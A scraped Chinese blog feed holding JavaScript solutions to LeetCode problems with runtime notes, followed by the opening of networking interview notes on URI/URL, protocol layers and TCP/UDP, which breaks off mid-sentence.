&#123;string&#125; str * @return &#123;number&#125; */var myAtoi = function(str) &#123; str = str.trim() let f = false,reg = /^\d*/ if(str.charAt(0)==&quot;-&quot;)&#123; f = true str = str.substring(1) &#125;else if(str.charAt(0)==&quot;+&quot;)&#123; str = str.substring(1) &#125; let number = parseInt(str.match(reg)) if(isNaN(number))&#123; return 0 &#125; if(number&gt;=2147483648&amp;&amp;f==true)&#123; number = 2147483648 &#125;else if(number&gt;=2147483648)&#123; number = 2147483647 &#125; if(f)&#123; number*=-1 &#125; return number&#125;; 暴力破解 执行用时 :92 ms, 在所有 JavaScript 提交中击败了96.15%的用户 内存消耗 :36.2 MB, 在所有 JavaScript 提交中击败了35.32%的用户 1234567891011var myAtoi = function(str) &#123; str = parseInt(str)||0; if(str&gt;2147483647 )&#123; return 2147483647 &#125; if(str&lt;-2147483648 )&#123; return -2147483648 &#125; return str;&#125;; parseInt已经实现这个功能了… 10. 正则表达式匹配给你一个字符串 s 和一个字符规律 p，请你来实现一个支持 ‘.’ 和 ‘*’ 的正则表达式匹配。 ‘.’ 匹配任意单个字符‘*’ 匹配零个或多个前面的那一个元素所谓匹配，是要涵盖 整个 字符串 s的，而不是部分字符串。 说明: s 可能为空，且只包含从 a-z 的小写字母。p 可能为空，且只包含从 a-z 的小写字母，以及字符 . 和 * 123var isMatch = function(s, p) &#123; return new RegExp(&quot;^&quot;+p+&quot;$&quot;).test(s)&#125;; 赖皮做法，JS无脑过 执行用时 :92 ms, 在所有 JavaScript 提交中击败了94.99%的用户 内存消耗 :34.9 MB, 在所有 JavaScript 提交中击败了37.08%的用户 11. 盛最多水的容器给定 n 个非负整数 a1，a2，…，an，每个数代表坐标中的一个点 (i, ai) 。在坐标内画 n 条垂直线，垂直线 i 的两个端点分别为 (i, ai) 和 (i, 0)。找出其中的两条线，使得它们与 x 轴共同构成的容器可以容纳最多的水。 说明：你不能倾斜容器，且 n 的值至少为 2。 示例: 输入: [1,8,6,2,5,4,8,3,7]输出: 49 1234567891011var maxArea = function(height) &#123; let maxarea = 0, l = 0, r = height.length - 1; while (l &lt; r) &#123; maxarea = Math.max(maxarea, Math.min(height[l], height[r]) * (r - l)); if (height[l] &lt; height[r]) l++; else r--; &#125; return maxarea;&#125;; 外围逼近，中间扩展以及滑动窗口都跪了 执行用时 :64 ms, 在所有 JavaScript 提交中击败了99.65%的用户 内存消耗 :35.4 MB, 在所有 JavaScript 提交中击败了63.90%的用户 55. 跳跃游戏给定一个非负整数数组，你最初位于数组的第一个位置。 数组中的每个元素代表你在该位置可以跳跃的最大长度。 判断你是否能够到达最后一个位置。 示例 1: 输入: [2,3,1,1,4]输出: true解释: 从位置 0 到 1 跳 1 步, 然后跳 3 步到达最后一个位置。示例 2: 输入: [3,2,1,0,4]输出: false解释: 无论怎样，你总会到达索引为 3 的位置。但该位置的最大跳跃长度是 0 ， 所以你永远不可能到达最后一个位置。 12345678910111213141516171819202122232425var canJump = function(nums) &#123; let length = nums.length; let front = nums[0], behind = 0,temp=0,last=0; while(front&lt;length-1&amp;&amp;last!=front)&#123; last=front temp=behind while(behind&lt;front-1)&#123; behind++ temp=Math.max(temp,behind+nums[behind]) &#125; if(temp&gt;front)&#123; [front,behind]=[front,temp].sort((a,b)=&gt;b-a) &#125;else&#123; behind=front front+=nums[front] &#125; &#125; if(front&gt;=length-1)&#123; return true &#125;else&#123; return false &#125; &#125;; 执行用时 :84 ms, 在所有 JavaScript 提交中击败了66.37%的用户 内存消耗 :35.5 MB, 在所有 JavaScript 提交中击败了57.97%的用户 62. 不同路径一个机器人位于一个 m x n 网格的左上角 （起始点在下图中标记为“Start” ）。 机器人每次只能向下或者向右移动一步。机器人试图达到网格的右下角（在下图中标记为“Finish”）。 问总共有多少条不同的路径？ 示例 1: 输入: m = 3, n = 2输出: 3解释:从左上角开始，总共有 3 条路径可以到达右下角。 向右 -&gt; 向右 -&gt; 向下 向右 -&gt; 向下 -&gt; 向右 向下 -&gt; 向右 -&gt; 向右 123456var uniquePaths = function(m, n) &#123; if(m==1||n==1)&#123; return 1 &#125; return uniquePaths(m-1,n)+uniquePaths(m,n-1)&#125;; 递归DP，容易超时，二维数组考虑越界问题 1234567891011121314var uniquePaths = function(m, n) &#123; let dp = []; for(let j=0;j&lt;n;++j)&#123; dp.push([]) for(let i = 0;i&lt;m;++i)&#123; if(i==0||j==0)&#123; dp[j][i]=1 &#125;else&#123; dp[j].push(dp[j][i-1]+dp[j-1][i]) &#125; &#125; &#125; return dp[n-1][m-1]&#125;; DP 12345678910var uniquePaths = function(m, n) &#123; var a= new Array(n).fill(1); var dp=new Array(m).fill(a); for(var i=1; i&lt;m; i++)&#123; for(var j=1; j&lt;n; j++)&#123; dp[i][j]=dp[i-1][j] + dp[i][j-1]; &#125; &#125; return dp[m-1][n-1];&#125;; new Array(n).fill(1) 这个操作省时 63. 不同路径 II输入:[ [0,0,0], [0,1,0], [0,0,0]]输出: 2解释:3x3 网格的正中间有一个障碍物。从左上角到右下角一共有 2 条不同的路径： 向右 -&gt; 向右 -&gt; 向下 -&gt; 向下 向下 -&gt; 向下 -&gt; 向右 -&gt; 向右 12345678910111213141516171819202122var uniquePathsWithObstacles = function(obstacleGrid) &#123; let m = obstacleGrid.length,n = obstacleGrid[0].length; var a= new Array(n).fill(0); var dp=new Array(m).fill(a); for(let i=0; i&lt;m; i++)&#123; for(let j=0; j&lt;n; j++)&#123; if(i == 0 &amp;&amp; j == 0)&#123; dp[i][j]=1; &#125;else if(i == 0)&#123; dp[i][j]=dp[i][j-1] &#125;else if(j == 0)&#123; dp[i][j]=dp[i-1][j] &#125;else&#123; dp[i][j]=dp[i][j-1]+dp[i-1][j] &#125; if(obstacleGrid[i][j]==1)&#123; dp[i][j]=0 &#125; &#125; &#125; return dp[m-1][n-1];&#125;; let a = new Array(2).fill(0) let b = new Array(K+1).fill(a) let dp = new Array(n).fill(b) fill创建三维数组带来浅拷贝的问题，Array.fill()如果填充类型为对象，则为浅拷贝。数组内的对象指向的都是同一个内存地址。 你可以这样做执行用时 :88 ms, 在所有 JavaScript 提交中击败了65.92%的用户 内存消耗 :34.9 MB, 在所有 JavaScript 提交中击败了98.31%的用户 98. 验证二叉搜索树给定一个二叉树，判断其是否是一个有效的二叉搜索树。 假设一个二叉搜索树具有如下特征： 节点的左子树只包含小于当前节点的数。节点的右子树只包含大于当前节点的数。所有左子树和右子树自身必须也是二叉搜索树。 深搜123456789101112131415161718192021222324252627var isValidBST = function(root) &#123; if(root == null)&#123; return true &#125; let right = leftest(root.right) let left = rightest(root.left) if (left &amp;&amp; left.val &gt;= root.val) &#123; return false &#125; if (right &amp;&amp; right.val &lt;= root.val) &#123; return false &#125; return isValidBST(root.left) &amp;&amp; isValidBST(root.right)&#125;;function rightest(node)&#123; while(node &amp;&amp; node.right)&#123; node = node.right &#125; return node&#125;function leftest(node)&#123; while(node &amp;&amp; node.left)&#123; node = node.left &#125; return node&#125; 对比左子树最右节点和右子树最左节点确保左子树所有值小于自身，右大于自身 执行用时 :112 ms, 在所有 JavaScript 提交中击败了30.95%的用户 内存消耗 :37.4 MB, 在所有 JavaScript 提交中击败了57.23%的用户 12345678910var isValidBST = function(root, arr = []) &#123; if (!root) return true; return isValidBST(root.left, arr) &amp;&amp; compareAndPush(root.val, arr) &amp;&amp; isValidBST(root.right, arr);&#125;;function compareAndPush (val, arr) &#123; if (arr.length) if (arr[arr.length - 1] &gt;= val) return false arr.push(val); return true;&#125; 中序遍历方法 1234567891011121314/** * @param &#123;TreeNode&#125; root * @param &#123;TreeNode&#125; pre 当前节点值的下限 * @param &#123;TreeNode&#125; next 当前节点值的上限 * @return &#123;boolean&#125; */var isValidBST = function(root, pre = null, next = null) &#123; if (!root) return true; // 在这里打印日志可以很好的观察到遍历顺序以及每个节点到底与哪些上下限进行了比较 // console.log(root &amp;&amp; root.val, pre &amp;&amp; pre.val, next &amp;&amp; next.val); if (pre &amp;&amp; pre.val &gt;= root.val) return false; if (next &amp;&amp; next.val &lt;= root.val) return false; return isValidBST(root.left, pre, root) &amp;&amp; isValidBST(root.right, root, next);&#125;; 因为在每个二叉搜索树中，根节点的值一定比左子树所有节点的值大且一定比右子树所有节点的值小。巧妙的将这些上下限值通过函数递归传给子节点来进行比较。顺便发现了该方法的遍历顺序就是先序遍历 123456789101112131415161718var isValidBST = function(root) &#123; let data = [] Inorder(root,data) for(let i=0;i+1&lt;data.length;i++)&#123; if(data[i]&gt;=data[i+1]) return false &#125; return true&#125;;function Inorder(root,data)&#123; if(root)&#123; Inorder(root.left,data) data.push(root.val) Inorder(root.right,data) &#125; else return&#125; 最快，把树全部打印成数组从头比较过去 101. 对称二叉树广搜123456789101112var isSymmetric = function(root) &#123; return isM(root,root)&#125;;function isM(n1,n2)&#123; if(n1==null&amp;&amp;n2==null)&#123; return true &#125; if(n1==null||n2==null)&#123; return false &#125; return n1.val==n2.val &amp;&amp; isM(n1.left,n2.right) &amp;&amp; isM(n1.right,n2.left)&#125; 执行用时 :88 ms, 在所有 JavaScript 提交中击败了72.72%的用户 内存消耗 :35.4 MB, 在所有 JavaScript 提交中击败了53.38%的用户 121. 买卖股票的最佳时机低进高出 12345678910111213var maxProfit = function(prices) &#123; let low = prices[0],high = prices[0],profit = 0; prices.forEach((ele)=&gt;&#123; if(ele&lt;low)&#123; low = ele high = ele &#125;else if(ele&gt;high)&#123; high = ele profit = Math.max(profit,high-low) &#125; &#125;) return profit&#125;; for of 比 forEach更耗空间一些，时间上有随机的可能 执行用时 :72 ms, 在所有 JavaScript 提交中击败了98.04%的用户 内存消耗 :35 MB, 在所有 JavaScript 提交中击败了92.95%的用户 122. 买卖股票的最佳时机 II多笔交易 12345678910111213141516var maxProfit = function(prices) &#123; let low = prices[0],high = prices[0],profit = 0,total = 0; for(let ele of prices)&#123; if(ele&gt;high)&#123; high = ele profit = Math.max(profit,high-low) &#125;else&#123; total +=profit; profit = 0; low = ele high = ele &#125; &#125; total +=profit return total&#125;; 执行用时 :88 ms, 在所有 JavaScript 提交中击败了51.61%的用户 内存消耗 :36.3 MB, 在所有 JavaScript 提交中击败了7.56%的用户 123. 买卖股票的最佳时机 III限制交易次数 状态转移方程每天都有三种「选择」：买入、卖出、无操作 这个问题的「状态」有三个，第一个是天数，第二个是允许交易的最大次数，第三个是当前的持有状态 https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-iii/solution/yi-ge-tong-yong-fang-fa-tuan-mie-6-dao-gu-piao-wen/ 123456789101112dp[i][k][0 or 1]0 &lt;= i &lt;= n-1, 1 &lt;= k &lt;= Kn 为天数，大 K 为最多交易数此问题共 n × K × 2 种状态，全部穷举就能搞定。for(let i=0; i&lt;n; i++)&#123; for(let k=K; k&gt;=1; k--)&#123; for(let s=0; s&lt;2; s++)&#123; dp[i][k][s] = max(buy, sell, rest) &#125; &#125;&#125; 我们想求的最终答案是 dp 【n - 1】【 K】【0】，即最后一天，最多允许 K 次交易，最多获得多少利润。读者可能问为什么不是dp 【n - 1】【 K】【1】？因为 [1] 代表手上还持有股票，[0] 表示手上的股票已经卖出去了，很显然后者得到的利润一定大于前者。 现在，我们完成了「状态」的穷举，我们开始思考每种「状态」有哪些「选择」，应该如何更新「状态」。只看「持有状态」，可以画个状态转移图。 通过这个图可以很清楚地看到，每种状态（0 和 1）是如何转移而来的。根据这个图，我们来写一下状态转移方程： 1234567891011121314dp[i][k][0] = max(dp[i-1][k][0], dp[i-1][k][1] + prices[i]) max(选择 rest,选择 sell)解释：今天我没有持有股票，有两种可能：要么是我昨天就没有持有，然后今天选择 rest，所以我今天还是没有持有；要么是我昨天持有股票，但是今天我 sell 了，所以我今天没有持有股票了。dp[i][k][1] = max(dp[i-1][k][1], dp[i-1][k-1][0] - prices[i]) max(选择 rest,选择 buy)解释：今天我持有着股票，有两种可能：要么我昨天就持有着股票，然后今天选择 rest，所以我今天还持有着股票；要么我昨天本没有持有，但今天我选择 buy，所以今天我就持有股票了。注意 k 的限制，我们在选择 buy 的时候，把 k 减小了 1，很好理解吧，当然你也可以在 sell的时候减 1。 还差最后一点点，就是定义 base case，即最简单的情况。 123base case：dp[-1][k][0] = dp[i][0][0] = 0dp[-1][k][1] = dp[i][0][1] = -infinity 12345678910111213141516171819var maxProfit = function(prices) &#123; if(prices.length==0)&#123; return 0 &#125; let n = prices.length,K = 2; let dp = new Array(n).fill([[0,0],[0,0],[0,0]]) for(let i=0; i&lt;n; i++)&#123; for(let k=K; k&gt;0; k--)&#123; if(i==0)&#123; dp[i][k][0] = 0; dp[i][k][1] = 0-prices[i]; continue; &#125; dp[i][k][0] = Math.max(dp[i-1][k][0], dp[i-1][k][1] + prices[i]) dp[i][k][1] = Math.max(dp[i-1][k][1], dp[i-1][k-1][0]-prices[i]) &#125; &#125; return dp[n-1][K][0]&#125;; 123456789//[3,3,5,0,0,3,1,4][ [ [ 0, 0 ], [ 4, 0 ], [ 6, 2 ] ], [ [ 0, 0 ], [ 4, 0 ], [ 6, 2 ] ], [ [ 0, 0 ], [ 4, 0 ], [ 6, 2 ] ], [ [ 0, 0 ], [ 4, 0 ], [ 6, 2 ] ], [ [ 0, 0 ], [ 4, 0 ], [ 6, 2 ] ], [ [ 0, 0 ], [ 4, 0 ], [ 6, 2 ] ], [ [ 0, 0 ], [ 4, 0 ], [ 6, 2 ] ], [ [ 0, 0 ], [ 4, 0 ], [ 6, 2 ] ] ] 12345678910111213141516var maxProfit = function(prices) &#123; if(prices.length===0)&#123; return 0 &#125; // 设置基础条件 var dp10=0,dp20=0 var dp11=-prices[0], dp21 = -prices[0] for(let i=1;i&lt;prices.length;i++)&#123; dp11=Math.max(dp11,-prices[i]) dp10=Math.max(dp10,dp11+prices[i]) //此行完成状态转移 dp21=Math.max(dp21,dp10-prices[i]) dp20=Math.max(dp20,dp21+prices[i]) &#125; return dp20&#125;; 循环执行避免创建数组的耗时 执行用时 :96 ms, 在所有 JavaScript 提交中击败了63.11%的用户 内存消耗 :36.4 MB, 在所有 JavaScript 提交中击败了53.33%的用户 155. 最小栈123456789101112131415161718192021222324252627282930313233343536373839404142434445/** * initialize your data structure here. */var MinStack = function() &#123; this.stack = new Array()&#125;;/** * @param &#123;number&#125; x * @return &#123;void&#125; */MinStack.prototype.push = function(x) &#123; this.stack[this.stack.length]=x&#125;;/** * @return &#123;void&#125; */MinStack.prototype.pop = function() &#123; this.stack[this.stack.length-1]=null this.stack.length--&#125;;/** * @return &#123;number&#125; */MinStack.prototype.top = function() &#123; return this.stack[this.stack.length-1]&#125;;/** * @return &#123;number&#125; */MinStack.prototype.getMin = function() &#123; return Math.min(...this.stack)&#125;;/** * Your MinStack object will be instantiated and called as such: * var obj = new MinStack() * obj.push(x) * obj.pop() * var param_3 = obj.top() * var param_4 = obj.getMin() */ 执行用时 :356 ms, 在所有 JavaScript 提交中击败了10.05%的用户 内存消耗 :44.3 MB, 在所有 JavaScript 提交中击败了38.10%的用户 123456789101112131415161718192021222324var MinStack = function() &#123; this.val = []; this.min = Infinity; this.top;&#125;;MinStack.prototype.push = function(x) &#123; this.val.push(x); this.min = this.min &gt; x ? x : this.min; this.topVal = x;&#125;;MinStack.prototype.pop = function() &#123; var popVal = this.val.pop(); if(this.min === popVal) &#123; this.min = Math.min(...this.val); &#125; this.topVal = this.val[this.val.length - 1]; return popVal;&#125;;MinStack.prototype.top = function() &#123; return this.topVal;&#125;;MinStack.prototype.getMin = function() &#123; return this.min;&#125;; 在push是确定最小可提升getMin 性能 169. 求众数众数是指在数组中出现次数大于 ⌊ n/2 ⌋ 的元素。 123456789101112131415161718var majorityElement = function(nums) &#123; let map = new Map(),length = nums.length; for(let i = 0;i&lt;length;i++)&#123; if(map.has(nums[i]))&#123; map.set(nums[i],map.get(nums[i])+1) &#125;else&#123; map.set(nums[i],1) &#125; &#125; let maxValue,maxKey for(let [key,value] of map)&#123; if(!maxValue || maxValue &lt; value) &#123; maxValue = value maxKey = key &#125; &#125; return maxKey&#125;; 执行用时 :132 ms, 在所有 JavaScript 提交中击败了20.61%的用户 内存消耗 :37.7 MB, 在所有 JavaScript 提交中击败了29.33%的用户 哈希表法 12345678910111213141516var majorityElement = function (nums) &#123; if (nums.length === 1) &#123; return nums[0]; &#125; const map = new Map(); for (let num of nums) &#123; if (!map.get(num)) &#123; map.set(num, 1); &#125; else &#123; map.set(num, map.get(num) + 1); if (map.get(num) &gt; nums.length / 2) &#123; return num; &#125; &#125; &#125;&#125;; 栈 位运算 异位相消 188. 买卖股票的最佳时机 IV1234567891011121314151617181920212223var maxProfit = function (k, prices) &#123; let n = prices.length; if(n==0)&#123; return 0 &#125; if(k&gt;n/2)&#123; let ans = 0 for(let i=0;i&lt;n-1;i++)&#123; ans = Math.max(ans,ans+prices[i+1]-prices[i]) &#125; return ans &#125;else&#123; let dp0 = new Array(k+1).fill(0) let dp1 = new Array(k+1).fill(-prices[0]) for(let i = 1;i&lt;n;i++)&#123; for(let j = 1;j&lt;k+1;j++)&#123; dp0[j]=Math.max(dp0[j],dp1[j]+prices[i]) dp1[j]=Math.max(dp1[j],dp0[j-1]-prices[i]) &#125; &#125; return dp0[k] &#125;&#125;; k&gt;n/2跟不限次数交易一样 执行用时 :88 ms, 在所有 JavaScript 提交中击败了93.75%的用户 内存消耗 :35.2 MB, 在所有 JavaScript 提交中击败了100.00%的用户 200. 岛屿数量给定一个由 ‘1’（陆地）和 ‘0’（水）组成的的二维网格，计算岛屿的数量。一个岛被水包围，并且它是通过水平方向或垂直方向上相邻的陆地连接而成的。你可以假设网格的四个边均被水包围。 示例 1: 输入:11110110101100000000 输出: 1 12345678910111213141516171819202122232425262728293031323334/** * @param &#123;character[][]&#125; grid * @return &#123;number&#125; */var numIslands = function(grid) &#123; if(grid.length==0||grid[0].length==0)&#123; return 0 &#125; let count=0; for(let i=0;i&lt;grid.length;i++)&#123; for(let j=0;j&lt;grid[0].length;j++)&#123; if(grid[i][j]==1)&#123; count++ islandClean(i,j,grid) &#125; &#125; &#125; function islandClean(i,j)&#123; grid[i][j]=0 if(j+1&lt;grid[0].length&amp;&amp;grid[i][j+1]==1)&#123; islandClean(i,j+1) &#125; if(i+1&lt;grid.length&amp;&amp;grid[i+1][j]==1)&#123; islandClean(i+1,j) &#125; if(j-1&gt;=0&amp;&amp;grid[i][j-1]==1)&#123; islandClean(i,j-1) &#125; if(i-1&gt;=0&amp;&amp;grid[i-1][j]==1)&#123; islandClean(i-1,j) &#125; &#125; return count&#125;; 感染法，把计数岛屿部分全部归零 执行用时 :84 ms, 在所有 JavaScript 提交中击败了93.77%的用户 内存消耗 :37.8 MB, 在所有 JavaScript 提交中击败了50.50%的用户 215. 数组中的第K个最大元素1234567891011var findKthLargest = function(nums, k) &#123; let arr = nums.slice(0,k),len = nums.length; arr.sort((a,b)=&gt;a-b) for(let i=k;i&lt;len;i++)&#123; if(nums[i]&gt;arr[0])&#123; arr[0]=nums[i] arr.sort((a,b)=&gt;a-b) &#125; &#125; return arr[0]&#125;; 执行用时 :372 ms, 在所有 JavaScript 提交中击败了7.31%的用户 内存消耗 :38.4 MB, 在所有 JavaScript 提交中击败了7.19%的用户 292. Nim 游戏你和你的朋友，两个人一起玩 Nim 游戏：桌子上有一堆石头，每次你们轮流拿掉 1 - 3 块石头。 拿掉最后一块石头的人就是获胜者。你作为先手。 你们是聪明人，每一步都是最优解。 编写一个函数，来判断你是否可以在给定石头数量的情况下赢得游戏。 如果有五块、六块、或是七块石头，你可以控制自己拿取的石头数，总是恰好给你的对手留下四块石头，使他输掉这场比赛。但是如果石头堆里有八块石头，你就不可避免地会输掉，因为不管你从一堆石头中挑出一块、两块还是三块，你的对手都可以选择三块、两块或一块，以确保在再一次轮到你的时候，你会面对四块石头。 123var canWinNim = function(n) &#123; if(n%4==0)&#123;return false&#125;else&#123;return true&#125;&#125;; 执行用时 :76 ms, 在所有 JavaScript 提交中击败了59.01%的用户 内存消耗 :33.8 MB, 在所有 JavaScript 提交中击败了22.35%的用户 12return n % 4 == 0 ? false : true更快 319. 灯泡开关初始时有 n 个灯泡关闭。 第 1 轮，你打开所有的灯泡。 第 2 轮，每两个灯泡你关闭一次。 第 3 轮，每三个灯泡切换一次开关（如果关闭则开启，如果开启则关闭）。第 i 轮，每 i 个灯泡切换一次开关。 对于第 n 轮，你只切换最后一个灯泡的开关。 找出 n 轮后有多少个亮着的灯泡。 于是转而观察某个位置，看看某个位置是怎样变化的，什么条件下会翻转 第18个灯泡会在1,2,3,6,9,18轮翻转。第36个灯泡会在1,2,3,4,6,9,13,18,36轮翻转。 规律显而易见，只有在轮数是该位置因数的时候才会执行翻转操作。 于是我们回答了那个问题：只要找到该位置的所有因数个数，我们就知道该位置翻转了多少次。 更进一步的，除了完全平方数，因数都是成对出现的，这意味着实际起到翻转作用(0-&gt;1)的，只有完全平方数而已。 此时任务已经大大简化，因为n个灯泡翻转n轮，我们只要看看到n位置，一共有多少个完全平方数即可。 parseInt()比Math.floor()快 123var bulbSwitch = function(n) &#123; return Math.floor(Math.sqrt(n))&#125;; 执行用时 :72 ms, 在所有 JavaScript 提交中击败了79.17%的用户 内存消耗 :33.8 MB, 在所有 JavaScript 提交中击败了12.50%的用户 777. 在LR字符串中交换相邻字符在一个由 ‘L’ , ‘R’ 和 ‘X’ 三个字符组成的字符串（例如”RXXLRXRXL”）中进行移动操作。一次移动操作指用一个”LX”替换一个”XL”，或者用一个”XR”替换一个”RX”。现给定起始字符串start和结束字符串end，请编写代码，当且仅当存在一系列移动操作使得start可以转换成end时， 返回True。 123456789101112131415161718192021222324252627var canTransform = function(start, end) &#123; let i=0,j=0; while(i&lt;start.length&amp;&amp;j&lt;start.length)&#123; while(start.charAt(i)==&quot;X&quot;)&#123; i++ &#125; while(end.charAt(j)==&quot;X&quot;)&#123; j++ &#125; if(start[i]!=end[j])&#123; return false &#125;//LR不能互相穿过 if(start[i]==&quot;R&quot;)&#123; if(i&gt;j)&#123; return false &#125; &#125;//R只能右移 if(start[i]==&quot;L&quot;)&#123; if(i&lt;j)&#123; return false &#125; &#125;//L只能左移 i++ j++ &#125; return true&#125;; 执行用时 :92 ms, 在所有 JavaScript 提交中击败了72.73%的用户 内存消耗 :35.7 MB, 在所有 JavaScript 提交中击败了100.00%的用户 1033. 移动石子直到连续三枚石子放置在数轴上，位置分别为 a，b，c。 每一回合，我们假设这三枚石子当前分别位于位置 x, y, z 且 x &lt; y &lt; z。从位置 x 或者是位置 z 拿起一枚石子，并将该石子移动到某一整数位置 k 处，其中 x &lt; k &lt; z 且 k != y。 当你无法进行任何移动时，即，这些石子的位置连续时，游戏结束。 要使游戏结束，你可以执行的最小和最大移动次数分别是多少？ 以长度为 2 的数组形式返回答案：answer = [minimum_moves, maximum_moves] 1234567891011121314151617var numMovesStones = function(a, b, c) &#123; [a,b,c]=[a,b,c].sort((a,b)=&gt;a-b) let arr=[0,0]; if(b-a==1&amp;&amp;c-b==1)&#123; return arr &#125;else if(b-a==1)&#123; arr[0]=1 &#125;else if(c-b==1)&#123; arr[0]=1 &#125;else if(b-a==2||c-b==2)&#123; arr[0]=1 &#125;else&#123; arr[0]=2 &#125; arr[1]=c-a-2 return arr&#125;; 执行用时 :76 ms, 在所有 JavaScript 提交中击败了90.20%的用户 内存消耗 :33.9 MB, 在所有 JavaScript 提交中击败了100.00%的用户]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2Finterview_web%2F</url>
    <content type="text"><![CDATA[前言 计算机网络 大白话，就是URI是抽象的定义，不管用什么方法表示，只要能定位一个资源，就叫URI，本来设想的的使用两种方法定位：1，URL，用地址定位；2，URN 用名称定位。 通过URL找到资源是对网络位置进行标识，如：通过URI找到资源是通过对名称进行标识，这个名称在某命名空间中，并不代表网络地址，如：urn:issn:1535-3613 URI 是统一资源标识符，而 URL 是统一资源定位符。因此，笼统地说，每个 URL 都是 URI，但不一定每个 URI 都是 URL。这是因为 URI 还包括一个子类，即统一资源名称 (URN)，它命名资源但不指定如何定位资源。上面的 mailto、news 和 isbn URI 都是 URN 的示例。 URI 和 URL 概念上的不同反映在此类和 URL 类的不同中。 此类的实例代表由 RFC 2396 定义的语法意义上的一个 URI 引用。URI 可以是绝对的，也可以是相对的。对 URI 字符串按照一般语法进行解析，不考虑它所指定的方案（如果有）不对主机（如果有）执行查找，也不构造依赖于方案的流处理程序。相等性、哈希计算以及比较都严格地根据实例的字符内容进行定义。换句话说，一个 URI 实例和一个支持语法意义上的、依赖于方案的比较、规范化、解析和相对化计算的结构化字符串差不多。 作为对照，URL 类的实例代表了 URL 的语法组成部分以及访问它描述的资源所需的信息。URL 必须是绝对的，即它必须始终指定一个方案。URL 字符串按照其方案进行解析。通常会为 URL 建立一个流处理程序，实际上无法为未提供处理程序的方案创建一个 URL 实例。相等性和哈希计算依赖于方案和主机的 Internet 地址（如果有）；没有定义比较。换句话说，URL 是一个结构化字符串，它支持解析的语法运算以及查找主机和打开到指定资源的连接之类的网络 I/O 操作。 URI类不包含任何访问资源的方法，它唯一的作用就是解析。 相反的是，URL类可以打开一个到达资源的流。 URI—Uniform Resource Identifier通用资源标志符Web上可用的每种资源如HTML文档、图像、视频片段、程序等都是一个来URI来定位的URI一般由三部组成①访问资源的命名机制②存放资源的主机名③资源自身的名称，由路径表示，着重强调于资源。 URL—Uniform Resource Location统一资源定位符URL是Internet上用来描述信息资源的字符串，主要用在各种WWW客户程序和服务器程序上，特别是著名的Mosaic。采用URL可以用一种统一的格式来描述各种信息资源，包括文件、服务器的地址和目录等。URL一般由三部组成①协议(或称为服务方式)②存有该资源的主机IP地址(有时也包括端口号)③主机资源的具体地址。如目录和文件名等 五层协议 应用层 ：为特定应用程序提供数据传输服务，例如 HTTP、DNS 等协议。数据单位为报文。 传输层 ：为进程提供通用数据传输服务。由于应用层协议很多，定义通用的传输层协议就可以支持不断增多的应用层协议。运输层包括两种协议：传输控制协议 TCP，提供面向连接、可靠的数据传输服务，数据单位为报文段；用户数据报协议 UDP，提供无连接、尽最大努力的数据传输服务，数据单位为用户数据报。TCP 主要提供完整性服务，UDP 主要提供及时性服务。 网络层 ：为主机提供数据传输服务。而传输层协议是为主机中的进程提供数据传输服务。网络层把传输层传递下来的报文段或者用户数据报封装成分组。 数据链路层 ：网络层针对的还是主机之间的数据传输服务，而主机之间可以有很多链路，链路层协议就是为同一链路的主机提供数据传输服务。数据链路层把网络层传下来的分组封装成帧。 物理层 ：考虑的是怎样在传输媒体上传输数据比特流，而不是指具体的传输媒体。物理层的作用是尽可能屏蔽传输媒体和通信手段的差异，使数据链路层感觉不到这些差异。 OSI其中表示层和会话层用途如下： 表示层 ：数据压缩、加密以及数据描述，这使得应用程序不必关心在各台主机中数据内部格式不同的问题。 会话层 ：建立及管理会话。 五层协议没有表示层和会话层，而是将这些功能留给应用程序开发者处理。 TCP/IP它只有四层，相当于五层协议中数据链路层和物理层合并为网络接口层。 TCP/IP 体系结构不严格遵循 OSI 分层概念，应用层可能会直接使用 IP 层或者网络接口层。 基于TCP的应用层协议有：SMTP、TELNET、HTTP、FTP 基于UDP的应用层协议：DNS、TFTP（简单文件传输协议）、RIP（路由选择协议）、DHCP、BOOTP（是DHCP的前身）、IGMP（Internet组管理协议） DNS占用53号端口，同时使用TCP和UDP协议。DNS区域传输的时候使用TCP协议域名解析时使用UDP协议 各个协议的作用和关系以太网(Ethernet)协议:解决局域网内点对点通信IP协议: 解决多个局域网之间的通信TCP协议: TCP 是以太网协议和IP协议的上层协议，也是应用层协议的下层协议TCP 协议: 保证数据通信的完整性和可靠性，防止丢包。IP协议只是一个地址协议,并不保证数据包的完整。如果路由器丢包(比如缓存满了,新进来的数据包就会丢失),就需要发现丢了哪一个包,以及如何重新发送这个包.这就要依靠TCP协议。 传输层UDP 和 TCP 的特点 用户数据报协议 UDP（User Datagram Protocol）是无连接的，尽最大可能交付，没有拥塞控制，面向报文（对于应用程序传下来的报文不合并也不拆分，只是添加 UDP 首部），支持一对一、一对多、多对一和多对多的交互通信。 传输控制协议 TCP（Transmission Control Protocol）是面向连接的，提供可靠交付，有流量控制，拥塞控制，提供全双工通信，面向字节流（把应用层传下来的报文看成字节流，把字节流组织成大小不等的数据块），每一条 TCP 连接只能是点对点的（一对一）。 UDP 首部格式首部字段只有 8 个字节，包括源端口、目的端口、长度、检验和。12 字节的伪首部是为了计算检验和临时添加的。 TCP 首部格式 序号 ：用于对字节流进行编号，例如序号为 301，表示第一个字节的编号为 301，如果携带的数据长度为 100 字节，那么下一个报文段的序号应为 401。 确认号 ：期望收到的下一个报文段的序号。例如 B 正确收到 A 发送来的一个报文段，序号为 501，携带的数据长度为 200 字节，因此 B 期望下一个报文段的序号为 701，B 发送给 A 的确认报文段中确认号就为 701。 数据偏移 ：指的是数据部分距离报文段起始处的偏移量，实际上指的是首部的长度。 确认 ACK ：当 ACK=1 时确认号字段有效，否则无效。TCP 规定，在连接建立后所有传送的报文段都必须把 ACK 置 1。 同步 SYN ：在连接建立时用来同步序号。当 SYN=1，ACK=0 时表示这是一个连接请求报文段。若对方同意建立连接，则响应报文中 SYN=1，ACK=1。 终止 FIN ：用来释放一个连接，当 FIN=1 时，表示此报文段的发送方的数据已发送完毕，并要求释放连接。 窗口 ：窗口值作为接收方让发送方设置其发送窗口的依据。之所以要有这个限制，是因为接收方的数据缓存空间是有限的。 TCP 的三次握手 假设 A 为客户端，B 为服务器端。 首先 B 处于 LISTEN（监听）状态，等待客户的连接请求。 A 向 B 发送连接请求报文，SYN=1，ACK=0，选择一个初始的序号 x。 B 收到连接请求报文，如果同意建立连接，则向 A 发送连接确认报文，SYN=1，ACK=1，确认号为 x+1，同时也选择一个初始的序号 y。 A 收到 B 的连接确认报文后，还要向 B 